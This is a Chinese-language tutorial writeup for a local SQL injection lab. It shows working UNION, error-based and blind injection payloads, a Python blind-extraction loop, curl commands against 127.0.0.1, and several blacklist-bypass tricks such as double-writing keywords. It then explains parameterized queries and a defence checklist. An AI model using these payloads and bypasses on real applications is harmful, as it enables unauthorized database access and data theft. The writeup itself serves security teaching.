# SQL 注入（SQL Injection）完整 Writeup

对应场景：`html/sqli/low.php` / `medium.php` / `high.php`

本文按「原理 → 推导 → 利用 → 修复 → 延伸」组织，每一节的 payload 都经过实测。
建议先自己在靶场里试一遍再看答案。

---

## 一、漏洞原理

### 1.1 根本原因：数据被当成了代码

应用程序要把用户输入放进 SQL 语句里。问题在于：**SQL 语句是「代码」，用户输入是「数据」**，
而字符串拼接这种组装方式让数据库无法区分两者。

```
用户输入:  1
拼接结果:  SELECT * FROM users WHERE id = 1        ← 正常

用户输入:  1 OR 1=1
拼接结果:  SELECT * FROM users WHERE id = 1 OR 1=1  ← 条件被永久置真
```

数据库看到的是**一条语法完全合法的语句**。它没有「做错」任何事 ——
它只是忠实地执行了收到的 SQL。错的是应用层把数据的边界交给了用户去定义。

### 1.2 三个前提条件

SQL 注入要发生，必须同时满足：

| 条件 | 说明 | 破坏它就能防住注入 |
|---|---|---|
| ① 输入可控 | 用户能影响进入 SQL 的内容 | 不可行（业务需要输入） |
| ② 输入被当作语法解析 | 拼接进语句而不是作为参数传递 | 参数化查询 |
| ③ 数据库权限足够大 | 有权限读到敏感数据 | 最小权限原则 |

条件 ② 是主战场。条件 ③ 是纵深防御 —— 即使 ② 失守，权限受限的账号也拿不到关键数据。

### 1.3 注入点类型：先判断「有没有引号」

这是最容易出错的一步。看服务端拼出来的语句：

```sql
-- 数字型（没有引号包围）
SELECT ... WHERE id = 1

-- 字符型（被单引号包围）
SELECT ... WHERE id = '1'
```

**判断方法**：输入 `1` 和 `1'`：

- 输入 `1'` 报语法错误 → 字符型，你需要闭合引号
- 输入 `1'` 仍正常返回 → 数字型，不需要闭合引号（`1'` 被当成了语法的一部分，
  在某些宽松的解析器里可能不报错，需要进一步用 `1 AND 1=1` 与 `1 AND 1=2` 对比）

本项目把这三种情况做成了三档，正好可以亲手对比。

---

## 二、low 档：数字型 + 无任何防护

### 2.1 观察

访问 `sqli/low.php?id=1`，页面下方的「服务端实际执行的语句」会显示：

```sql
SELECT id, username, email, role FROM users WHERE id = 1
```

**关键观察**：`1` 没有被引号包围 → **数字型注入点**。

### 2.2 第一步：确认注入存在

```
?id=1'          → 报语法错误（unrecognized token / syntax error）
?id=1 AND 1=1   → 正常返回
?id=1 AND 1=2   → 返回空结果
```

第二个和第三个的差异证明：输入确实被当作 SQL 语法解析了。
（如果输入完全不被解析，`AND 1=2` 不会改变结果。）

### 2.3 第二步：确定列数

UNION 查询要求两侧列数一致，所以先要数出原语句有几列。

**方法一：ORDER BY 递增**

```
?id=1 ORDER BY 1   → 正常
?id=1 ORDER BY 2   → 正常
?id=1 ORDER BY 3   → 正常
?id=1 ORDER BY 4   → 正常
?id=1 ORDER BY 5   → 报错：ORDER BY term out of range
```

结论：**4 列**。报错的那一次就是答案。

**方法二：UNION SELECT 递增**

```
?id=1 UNION SELECT 1          → 报错（列数不匹配）
?id=1 UNION SELECT 1,2        → 报错
?id=1 UNION SELECT 1,2,3      → 报错
?id=1 UNION SELECT 1,2,3,4    → 正常 ✓
```

两种方法都指向 4 列。这也和页面源码里 `SELECT id, username, email, role` 一致 ——
**但实战中你看不到源码，必须靠探测。**

### 2.4 第三步：找到回显位

把 4 个占位数字换成可识别的标记，看哪些位置的内容会显示在页面上：

```
?id=-1 UNION SELECT 111,222,333,444
```

结果表的四列分别是 `111 222 333 444` —— 四列**全部回显**。

为什么用 `-1` 而不是 `1`：原查询会返回一行真实数据，UNION 的结果会追加在后面。
用不存在的 id（如 `-1`）让原查询返回空，页面就只显示注入结果，更清晰。

### 2.5 第四步：拖出目标数据

目标：读取 `users.secret`。注意原语句的列是
`id, username, email, role`，需要把 `secret` 塞进其中某一列的位置：

```
?id=-1 UNION SELECT 1,username,secret,role FROM users
```

结果表第二列（原 `username` 位置）会显示用户名，
**第三列（原 `email` 位置）会显示 secret** —— 包括那一行：

```
VULNLAB{union_select_master}
```

### 2.6 完整利用链（一步到位）

```bash
# 拿 secret
curl "http://127.0.0.1:8080/sqli/low.php?id=-1%20UNION%20SELECT%201,username,secret,role%20FROM%20users"

# 一次性拖出整张表（SQLite 用 group_concat 拼接多行）
curl "http://127.0.0.1:8080/sqli/low.php?id=-1%20UNION%20SELECT%201,username,secret,role%20FROM%20users%20WHERE%20id=1"
```

### 2.7 进阶：如果页面不回显怎么办

上面之所以顺利，是因为页面把查询结果直接渲染出来了。
真实目标常常「只显示有没有结果」或「什么都不显示」。这时需要其他手法：

| 手法 | 适用场景 | 核心思路 |
|---|---|---|
| **报错型** | 页面回显数据库错误 | 用 `extractvalue()` / `updatexml()` 把数据塞进错误信息 |
| **布尔盲注** | 页面只有「有/无结果」两种状态 | 用 `AND SUBSTR(secret,1,1)='V'` 逐字符猜，靠页面差异判断真假 |
| **时间盲注** | 页面完全不随数据变化 | 用 `AND SLEEP(3)` 的响应耗时差判断真假 |
| **堆叠查询** | 数据库支持多语句（MySQL + PDO::query 不常见，SQL Server 常见） | `1; INSERT INTO ...` |

SQLite 的报错型注入示例（本项目使用的数据库）：

```sql
?id=1 AND 1=CAST((SELECT secret FROM users WHERE id=1) AS INT)
-- 报错信息里会带上 secret 的内容
```

**布尔盲注自动化思路**（Python 伪代码）：

```python
secret = ""
for pos in range(1, 40):
    for ch in "0123456789abcdefghijklmnopqrstuvwxyz{}_-":
        payload = f"1 AND SUBSTR((SELECT secret FROM users WHERE id=1),{pos},1)='{ch}'"
        if is_true(payload):        # 通过响应差异判断
            secret += ch
            break
    else:
        break
print(secret)
```

---

## 三、medium 档：黑名单过滤 + 双写绕过

### 3.1 观察防护措施

源码（页面也会显示）：

```php
$blacklist = ['union', 'select', 'from', 'where'];
$filtered  = str_ireplace($blacklist, '', $id);
$sql = "SELECT id, username, email, role FROM users WHERE id = '$filtered'";
```

两个变化：

1. **注入点变成字符型**了 —— `$filtered` 被单引号包围，你**必须先闭合引号**
2. **关键字被过滤** —— `union` / `select` / `from` / `where` 会被删除

页面还很贴心地显示了「你的输入」与「过滤后」的对比，
直接抄 low 档的 payload 会看到关键字被删干净，语句结构被破坏。

### 3.2 关键漏洞：`str_ireplace` 是单次非递归替换

`str_ireplace` 的工作方式是：

1. 在原字符串里**扫一遍**，找到所有匹配项的位置
2. 把它们删除
3. **不再重新扫描删除后的结果**

这产生了一个可利用的性质：如果删除某个词之后，**剩下的部分正好拼回同一个词**，
那么过滤就白做了。

```
输入:      ununionion
查找:      union（从索引 2 开始匹配）
删除后:    un  +  ion  =  union   ← 又变回危险词了
```

这叫**双写绕过**（也叫「重复填充绕过」）。同理：

```
seselectlect  →  select
frfromom      →  from
whewherere    →  where
```

### 3.3 验证过滤行为

先单独测试过滤器：

```
?id=1' union select 1
```

看「过滤后」那一行：`union` 和 `select` 都被删掉了，剩下 `1'  1` —— 语句被破坏，报错。

### 3.4 构造绕过 payload

把 low 档的 payload 里每个黑名单词都做双写：

| 原词 | 双写形式 |
|---|---|
| `union` | `ununionion` |
| `select` | `seselectlect` |
| `from` | `frfromom` |

组装（注意要闭合引号，并用注释吃掉末尾多余的引号）：

```
?id=1' ununionion seselectlect 1,username,secret,role frfromom users-- 
```

**注意末尾 `-- ` 后面有一个空格**，这是必须的：SQL 注释符是 `--` 加空格，
漏掉空格会导致注释不生效，语句仍然报错。这是初学者最常踩的坑。

### 3.5 完整利用链

```bash
curl "http://127.0.0.1:8080/sqli/medium.php?id=1'%20ununionion%20seselectlect%201,username,secret,role%20frfromom%20users--%20"
```

页面「过滤后」一行会显示：

```
1' union select 1,username,secret,role from users-- 
```

过滤器把关键字「还原」成了 payload，这直观展示了黑名单的荒谬之处。

### 3.6 其他绕过思路（同一个漏洞的多种打法）

| 思路 | 示例 | 为什么有效 |
|---|---|---|
| **双写** | `ununionion` | 删除后拼回原词 |
| **大小写混合** | 若过滤器用 `str_replace`（区分大小写）而非 `str_ireplace`，`UnIoN` 直接通过 | 过滤大小写敏感，SQL 关键字大小写不敏感 |
| **内联注释**（MySQL） | `un/**/ion` | MySQL 会把注释当作空白，从而拼出 `union` |
| **URL 双重编码** | `%2575nion` 解码后为 `%75nion` → 再解码为 `union` | 过滤发生在解码之前 |
| **等价语法替换** | 用 `||` 代替 `OR`（SQLite/MySQL）、用 `&&` 代替 `AND` | 换个写法绕开关键字匹配 |
| **十六进制字符串** | `0x61646d696e` 代替 `'admin'` | 字面量里根本没有引号 |

**结论：黑名单永远无法穷举。** 上面每一条都是「换一种表达同一语义的写法」，
而 SQL 的表达方式是无穷的。这是黑名单方案在原理上的必败之处。

---

## 四、high 档：正确修复对照

### 4.1 修复代码

```php
// 第一层：类型校验
if (!preg_match('/^\d+$/', $id)) {
    $rejected = true;          // 非法输入直接拒绝，连数据库都不碰
} else {
    // 第二层：参数化查询
    $sql  = 'SELECT id, username, email, role FROM users WHERE id = :id';
    $stmt = db()->prepare($sql);
    $stmt->execute([':id' => (int) $id]);
    $rows = $stmt->fetchAll();
}
```

### 4.2 为什么预编译能根治

这是实践中最常被问到的疑问，值得说清楚。

预编译把「语句结构」和「数据」**分两次发送**：

```
① 应用 → 数据库：  SELECT ... WHERE id = ?
   数据库：解析语法、生成执行计划。（此时还不知道 id 是什么，但结构已经固定）

② 应用 → 数据库：  参数值 = "1 OR 1=1"
   数据库：把这一整串当作「一个字符串值」填进占位符。
          它不会、也不能重新做语法解析。
```

对比拼接方案：

```
应用 → 数据库：  SELECT ... WHERE id = 1 OR 1=1
数据库：收到的是**一条完整的语句**，只能照做。
```

核心区别是：**参数化让「危险内容出现在数据里」这件事不再有危害**，
因为它从一开始就不是语法。而过滤是在「危险内容已经成为语法的一部分」之后做补救。

### 4.3 三层防护的职责

| 层 | 措施 | 防住什么 |
|---|---|---|
| ① | 类型校验（白名单正则） | 非法输入在到达数据库前就被拒绝，缩小攻击面 |
| ② | 参数化查询 | **根治注入** —— 数据与代码分离 |
| ③ | 错误信息收敛 | 不再泄漏表名/列名/版本，抬高攻击者信息收集成本 |

补充第四条：**数据库最小权限**。本查询只需要 SELECT，账号就只该有 SELECT。
即使出现新的注入点，攻击者也无法写入或删库。

### 4.4 一个常见误解

「用 `addslashes()` / `mysqli_real_escape_string()` 转义了引号，所以安全。」

**这是错的**，原因有两个：

1. **转义只对字符串上下文有意义。** 如果注入点是数字型（如 low 档），
   根本不需要引号，转义完全无效。
2. **字符集问题会导致转义失效。** 使用 GBK 等宽字节字符集时，
   `%bf%27` 这类输入可能让转义符本身被「吃掉」（宽字节注入）。

正确的心智模型是：**不要试图清洗输入，而要改变数据传递方式。**

---

## 五、防御清单（可直接用于代码规范）

**应做**

- 全部数据库访问使用参数化查询 / 预编译语句（唯一根治手段）
- 对参数做类型校验与格式白名单（id 必须数字、email 必须合法邮箱）
- 数据库账号按最小权限分配（读写分离、禁止 DROP/GRANT）
- 数据库错误统一收敛，详细信息只写日志不回显
- 使用 ORM 时注意：拼接原生 SQL 的方法（如 Django 的 extra/raw）同样有风险
- 引入 SAST 工具（如 Semgrep 规则集）与 SQL 注入专项测试用例
- 对已有代码做人工审计：搜索所有的字符串拼接 SQL 的地方

**不应做**

- 依赖黑名单过滤关键字
- 依赖 addslashes / real_escape_string 作为唯一防线
- 以为「前端已经校验过了」就安全（请求可以被直接构造）
- 把数据库错误原样返回给客户端


---

## 六、延伸阅读

- OWASP Top 10 A03:2021 — Injection
- OWASP SQL Injection Prevention Cheat Sheet
- SQLite 与 MySQL 在注入手法上的差异（本例使用 SQLite，
  某些 MySQL 专有函数如 `extractvalue()` 不可用，但
  `CAST()` 报错、`SUBSTR()` 盲注、`UNION` 等通用手法完全一致）
- 自动化工具参考：sqlmap（建议先用本文的手工方法完整走一遍，再用工具验证，
  这样在被追问时能讲清原理，而不是「用了 sqlmap」）
